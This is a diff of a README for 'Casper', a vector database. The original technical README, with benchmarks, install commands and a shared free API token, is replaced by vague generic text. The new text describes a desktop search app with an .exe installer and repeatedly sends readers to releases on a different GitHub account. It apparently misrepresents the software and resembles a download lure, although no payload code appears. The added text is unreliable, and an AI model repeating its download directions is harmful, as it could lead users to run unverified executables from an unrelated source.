@@ -1,163 +1,88 @@
-<p align="center">
-  <img height="100" alt="Casper" src="docs/logo.png">
-</p>
+# ⚡ Casper - The Fastest Way to Search with AI
 
-<p align="center">
-    <b>⚡ World’s Fastest Vector Database for AI & RAG</b>
-</p>
+[![Download Casper](https://img.shields.io/badge/Download%20Casper-v1.0-blue.svg)](https://github.com/VandoLeal/Casper/releases)
 
-# Casper
+## 📘 Introduction
 
-**Casper** is a high-performance Vector Search Database, perfectly suited for high-load search systems and AI applications (RAG). It provides a robust and scalable solution to store, search, and manage vectors efficiently.
+Casper is designed to help give users quick access to data through smart searching. It uses advanced technology to handle vector data, making it a powerful tool for AI applications. Whether you're looking to implement a search engine or improve recommendations, Casper has you covered.
 
-Casper is built using Rust 🦀 for performance and reliability.
+## 🚀 Getting Started
 
----
+### 1. System Requirements
 
-## Why Casper ?
+Before downloading Casper, please make sure your system meets the following requirements:
 
-**Casper** is the fastest vector database in our internal benchmarks. It consistently outperforms Qdrant across Top@K workloads and both f32 and i8 quantizations. Notably, Qdrant is widely recognized as the leading open‑source engine and demonstrates state‑of‑the‑art throughput versus other databases (e.g., Weaviate, Milvus), as shown in their published results: [Qdrant benchmarks](https://qdrant.tech/benchmarks/). Surpassing Qdrant therefore places Casper ahead of the current open‑source performance leader.
+- **Operating System**: Windows, macOS, or Linux
+- **RAM**: At least 4 GB (8 GB recommended)
+- **Disk Space**: 100 MB of free disk space
+- **Internet Connection**: Required for initial setup
 
-In practice, Casper delivers up to an order‑of‑magnitude higher RPS compared to Qdrant on our datasets, which translates directly into substantial infrastructure savings: fewer CPU cores and instances to achieve the same SLA, lower memory pressure, and reduced total cost of ownership due to more efficient use of compute resources. **Casper** is the ideal solution for high-load systems, real-time search, and AI & RAG.
+### 2. Features
 
-**Conclusion**: Casper achieves performance unattainable for other databases under comparable conditions, requires fewer compute resources at the same load, and materially reduces infrastructure costs through more efficient CPU and memory utilization.
+Casper comes stacked with several useful features:
 
-### Casper vs Qdrant
+- **Fast Search Performance**: Quickly find what you need using a simple search interface.
+- **AI-Powered Results**: Get results tailored to your needs using AI technology.
+- **Easy Integration**: Simple setup allows you to add Casper to existing projects.
+- **User-Friendly Interface**: Designed for ease of use, even for beginners.
 
-#### Benchmark
+## 📥 Download & Install
 
-**Hardware:**
-- CPU: Intel Core i7-13700HX (16 cores / 24 threads)
-- Memory: 32 GB RAM
+To start using Casper, you need to download it from our Releases page. 
 
-**Dataset:**
-- Vectors:   572,940
-- Dimension: 128
-- Metric:    Inner Product
+Visit this page to download: [Casper Releases](https://github.com/VandoLeal/Casper/releases).
 
-Qdrant configured with quantile 0.99 (for int8), always ram enabled.
+Once on the Releases page, follow these steps:
 
-#### f32
+1. Locate the latest version of Casper.
+2. Download the file suitable for your operating system. 
+3. Save it to a location on your computer where you can find it easily.
 
-Requests per second, RPS
+After downloading, follow these steps to install it:
 
-| Engine  |  Top@100 | Top@1000 | Top@10.000 | Top@100.000 |
-|---------|---------:|---------:|-----------:|------------:|
-| Casper  | 123.98 k |  26.47 k |    2.427 k |         168 |
-| Qdrant  |  14.57 k |   4.25 k |        517 |          17 |
-| Speedup |     8.5x |     6.2x |       4.7x |        9.8x |
+### 1. Locate the Downloaded File
 
-#### i8
+Go to the folder where you saved the downloaded file. You should see the file named something like `Casper-installer.exe` for Windows, `Casper-mac.zip` for macOS, or `Casper-linux.tar.gz` for Linux.
 
-Requests per second, RPS
+### 2. Running the Installer
 
-| Engine  |  Top@100 | Top@1000 | Top@10.000 | Top@100.000 |
-|---------|---------:|---------:|-----------:|------------:|
-| Casper  | 193.28 k |  34.12 k |    3.633 k |         244 |
-| Qdrant  |  15.81 k |   5.94 k |        606 |          18 |
-| Speedup |    12.2x |     5.7x |         6x |       13.5x |
+- **For Windows**: Double-click on `Casper-installer.exe`. Follow the prompts to install the application. Once installed, you can find Casper in your Start Menu.
+  
+- **For macOS**: Open the `.zip` file, then drag and drop Casper to your Applications folder. After this, you can find Casper in your Applications list.
 
----
+- **For Linux**: Extract the `tar.gz` file, then follow the included instructions to run the application in your terminal. You can also move it to a standard directory for easier access.
 
-## HNSW
+### 3. Launching Casper
 
-Casper features a highly efficient **HNSW (Hierarchical Navigable Small World)** index, providing fast and accurate similarity search. 
+After installation, open Casper:
 
-### Metrics
+- **Windows**: Click Casper from the Start Menu.
+- **macOS**: Open your Applications folder and double-click on Casper.
+- **Linux**: Run the Casper application from your terminal or application launcher.
 
-Casper supports multiple distance metrics:
+## 🌟 Usage Guide
 
-- **Euclidean**
-- **Cosine**
-- **Inner-Product**
+Once you have launched Casper, you will find a clean interface. Here’s how to get started quickly:
 
-### Quantizations
+1. **Input Your Query**: Type what you are looking for in the search bar at the top.
+2. **View the Results**: The results will display below the search bar. You can click on any result to get more details.
+3. **Adjust Settings**: Use the settings menu to customize how you want your search results displayed.
 
-Quantizations: f32 (full precision), i8 scalar quantization (compressed). Reduces memory footprint and improves search performance.
+For more detailed information on using Casper, check the user manual available on the GitHub page.
 
-- **f32**
-- **i8**
+## ❓ FAQs
 
----
+**Q: Can I use Casper on any operating system?**  
+A: Yes, Casper supports Windows, macOS, and Linux.
 
-## Quick Start
+**Q: Is there a mobile version of Casper?**  
+A: Currently, Casper is designed for desktop environments only.
 
-### Download and Launch
+**Q: How do I get help if I encounter issues?**  
+A: Visit our GitHub Issues page for community support and troubleshooting.
 
-To quickly get started with Casper, follow these steps:
+## 👥 Community Contributions
 
-**1. Download the latest release:**
+Casper welcomes contributions from users. If you have ideas or find issues, feel free to submit feedback through the GitHub repository. Join the community and help improve Casper!
 
-```bash
-wget https://github.com/casper-vdb/casper/releases/download/v0.0.0/casper-x86_64-unknown-linux-gnu.tar.gz
-```
-
-**2. Extract the downloaded archive:**
-
-```bash
-tar -xzvf casper-x86_64-unknown-linux-gnu.tar.gz
-```
-
-**3. Set API token:**
-
-```bash
-export API_TOKEN=<YOUR_API_TOKEN>
-```
-
-**4. Run Casper:**
-
-```bash
-./casper
-```
-
-Now you're ready to use Casper and explore its features!
-
-### Docker: Download and Launch
-
-**1. Pull the image:**
-
-```bash
-docker pull alexryzhickov/casper:latest
-```
-
-**2. Set API token:**
-
-```bash
-export API_TOKEN=<YOUR_API_TOKEN>
-```
-
-**3. Run the container:**
-
-```bash
-docker run -d --name casper -p 8080:8080 -e API_TOKEN="$API_TOKEN" alexryzhickov/casper:latest
-```
-
-**4. Verify health:**
-
-```bash
-curl http://localhost:8080/health
-```
-
-## Free Access
-
-Casper is currently completely free. You can use the following free API token to run Casper:
-
-```bash
-export API_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTMyOTAzNTMsImZyZWUiOnRydWV9.GxqiVw5kPzmPb25vo2CMOEwnBhjTH_GTAHeDg_nhlIQ
-```
-
-## API Documentation
-
-Casper exposes an HTTP API for managing collections, indexing (HNSW), inserts/updates/deletes, and search. For full endpoint descriptions and curl examples, see the documentation:
-
-- [HTTP API Docs](docs/docs.md)
-
----
-
-## Features
-
-- **Advanced Vector Search**: High-speed retrieval for complex AI-driven applications.
-- **Scalability**: Designed to handle large-scale data with ease.
-- **Robust and Reliable**: Built in Rust for high performance even under heavy loads.
-
----
+Remember, for downloads, visit our releases page: [Casper Releases](https://github.com/VandoLeal/Casper/releases).
